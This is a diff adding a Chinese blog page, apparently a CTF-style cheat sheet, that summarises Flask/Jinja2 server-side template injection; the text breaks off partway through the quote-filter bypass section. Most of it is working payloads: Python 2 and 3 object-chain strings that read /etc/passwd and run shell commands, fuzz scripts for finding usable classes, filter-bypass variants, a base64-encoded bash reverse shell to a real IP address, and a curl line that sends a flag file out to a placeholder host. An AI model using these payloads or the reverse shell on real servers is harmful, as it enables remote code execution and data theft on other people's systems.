@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>flask模板注入总结</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/04/05/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90-%E4%B8%80/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/&title=flask模板注入总结" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/&title=flask模板注入总结" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/&text=flask模板注入总结" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=flask模板注入总结&body=Check out this article: http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-基础知识"><span class="toc-number">1.</span> <span class="toc-text">0x 01 基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-Python2-环境下测试"><span class="toc-number">2.</span> <span class="toc-text">0x 02 Python2 环境下测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-Python3-环境测试"><span class="toc-number">3.</span> <span class="toc-text">0x 03 Python3 环境测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-ByPass"><span class="toc-number">4.</span> <span class="toc-text">0x 04 ByPass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-过滤trick"><span class="toc-number">5.</span> <span class="toc-text">0x 05 过滤trick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-最后总结"><span class="toc-number">6.</span> <span class="toc-text">0x 06 最后总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-推荐工具"><span class="toc-number">7.</span> <span class="toc-text">0x 07 推荐工具</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        flask模板注入总结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-05T15:34:51.000Z" itemprop="datePublished">2020-04-05</time>
+        
+        (Updated: <time datetime="2020-04-07T01:09:16.208Z" itemprop="dateModified">2020-04-07</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x-01-基础知识"><a href="#0x-01-基础知识" class="headerlink" title="0x 01 基础知识"></a>0x 01 基础知识</h3><blockquote>
+<p>参考这篇文章：<a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">从零学习flask模板注入</a></p>
+</blockquote>
+<p>漏洞原理：不正确的使用flask中的<code>render_template_string()</code>导致的<code>SSTI</code>，并且<strong>模板内容直接受用户控制</strong></p>
+<p>注意：理论上不同机器、不同python版本的payload是不尽相同的。</p>
+<p>测试代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from flask import *</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def test():</span><br><span class="line">    code &#x3D; request.args.get(&#39;id&#39;)</span><br><span class="line">    html &#x3D; &#39;&#39;&#39;</span><br><span class="line">        &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">    &#39;&#39;&#39;%(code)</span><br><span class="line">    return render_template_string(html)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>文件读取/命令执行</strong></p>
+<p>无论是实现文件读取还是命令执行，需要利用对象的继承，先找到父类``，再寻找子类，最后找到我们需要用到的相应模块</p>
+<p><strong>几个要用到的魔术方法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-02-Python2-环境下测试"><a href="#0x-02-Python2-环境下测试" class="headerlink" title="0x 02 Python2 环境下测试"></a>0x 02 Python2 环境下测试</h3><p>测试环境：2.7.12</p>
+<p>①获取类对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__</span><br><span class="line">&lt;type &#39;str&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; request.__class__</span><br><span class="line">&lt;type &#39;module&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &#39;list&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &#39;tuple&#39;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>②寻找基类<code>object</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__</span><br><span class="line">(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; requests.__class__.__mro__</span><br><span class="line">(&lt;type &#39;module&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;type &#39;list&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__</span><br><span class="line">(&lt;type &#39;tuple&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;request.__class__.__mro__[8]</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>object在最底层故在列表中的最后，通过<code>__mro__[-1]</code>可以获取到</p>
+</blockquote>
+<p>③寻找可用的引用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, 等等</span><br></pre></td></tr></table></figure>
+
+<p>④尝试文件读取</p>
+<p><strong>payload</strong></p>
+<p>发现40的地方存在 <code>&lt;type &#39;file&#39;&gt;</code>，使用file方法可以读取文件:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">requests.__class__.__mro__[1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200405233521992.png" alt></p>
+<p><strong>Payload 2 利用&lt;class ‘warnings.catch_warnings’&gt;</strong></p>
+<p>’catch_warnings’可以进一步构造来执行命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()   </span><br><span class="line"></span><br><span class="line"># 引用__builtins__和file模块</span><br></pre></td></tr></table></figure>
+
+<p>⑤命令执行</p>
+<p>寻找包含<code>os</code>模块的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">num &#x3D; 0</span><br><span class="line">for item in &#39;&#39;.__class__.__mro__[-1].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;os&#39; in item.__init__.__globals__:</span><br><span class="line">             print num,item</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">71 &lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">76 &lt;class &#39;site.Quitter&#39;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>前面已经找到了包含<code>os</code>模块的类，先初始化，再引用即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200405235926575.png" alt></p>
+<p>这里命令执行没有回显，用popen函数带出结果或者通过反弹shell和利用<code>curl</code>带出</p>
+<p>改造后的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>curl带出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;data&#x3D;$(cat &#x2F;fffffflag | base64);curl http:&#x2F;&#x2F;x.x.x.x&#x2F;?data&#x3D;$data;&#39;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>扩展使用</li>
+</ul>
+<p>已知函数名可获取函数信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def fun(x&#x3D;1):</span><br><span class="line">    # nothing here</span><br><span class="line">    a&#x3D;x*2</span><br><span class="line">    flag&#x3D;&#39;neko&#39;</span><br><span class="line">    return a</span><br><span class="line">print fun.func_code.co_consts</span><br><span class="line">print fun.func_globals</span><br><span class="line"></span><br><span class="line">&#x3D;&gt;</span><br><span class="line">(None, 2, &#39;neko&#39;)</span><br><span class="line">&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;b.py&#39;, &#39;__package__&#39;: None, &#39;fun&#39;: &lt;function fun at 0x7f1b9317e750&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 无回显</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;) </span><br><span class="line"></span><br><span class="line"># 带回显</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure>
+
+<p>一般payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&quot;l&quot;+&quot;s&quot;)</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;)).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&#39;l&#39;+&#39;s&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;))()&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-03-Python3-环境测试"><a href="#0x-03-Python3-环境测试" class="headerlink" title="0x 03 Python3 环境测试"></a>0x 03 Python3 环境测试</h3><p>类似于Python2的,常用payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].popen(&quot;ls&quot;).read()</span><br><span class="line"># &lt;class &#39;os._wrap_close&#39;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[134].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br><span class="line"># &lt;class &#39;rlcompleter.Completer&#39;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).popen(&quot;ls&quot;).read()</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">&#39;&#39;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>就是<code>__global__</code>中存在<code>sys</code>或者<code>system</code>或者<code>__builtins__</code>模块,fuzz脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">for item in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;system&#39; in item.__init__.__globals__:</span><br><span class="line">             print(&#39;system&#39;,num,item)</span><br><span class="line">         if &#39;sys&#39; in item.__init__.__globals__:</span><br><span class="line">             print(&#39;sys&#39;,num,item)</span><br><span class="line">         if &#39;__builtins__&#39; in item.__init__.__globals__:</span><br><span class="line">         	 print(&#39;__builtins__&#39;,num,item)</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>Jinja2的for循环处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-04-ByPass"><a href="#0x-04-ByPass" class="headerlink" title="0x 04 ByPass"></a>0x 04 ByPass</h3><p><strong><code>.</code>被过滤</strong></p>
+<p>基础payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>getattr()</code>或者<code>|attr()</code>或者<code>[]</code>绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[].__class__	&#x3D;&gt;	getattr([],&#39;__class__&#39;)</span><br><span class="line">[].__class__.__base__	&#x3D;&gt;	getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[59]	&#x3D;&gt;	getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59]</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__	&#x3D;&gt;	getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;)</span><br><span class="line">...</span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;),&#39;__globals__&#39;)[&#39;linecache&#39;],&#39;__dict__&#39;)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>_</code>被过滤</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;base&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;linecache&#39;],dir(0)[0][0]*2+&#39;dict&#39;+dir(0)[0][0]*2)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line"># &#39;__class__&#39;&#x3D;&#x3D;&gt;dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2</span><br></pre></td></tr></table></figure>
+
+<p><strong>中括号被过滤</strong></p>
+<p>可以用<code>getitem</code>或者<code>pop</code>进行绕过过滤</p>
+<ul>
+<li>读取文件</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>命令执行</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.__globals__.linecache.os.pop</span><br></pre></td></tr></table></figure>
+
+<p><strong>引号被过滤</strong></p>
+<ul>
+<li>chr函数绕过过滤</li>
+</ul>
+<p>获取<code>chr</code>函数，后面直接将文件名字<code>chr</code>出来.<code>payload</code>如下：</p>
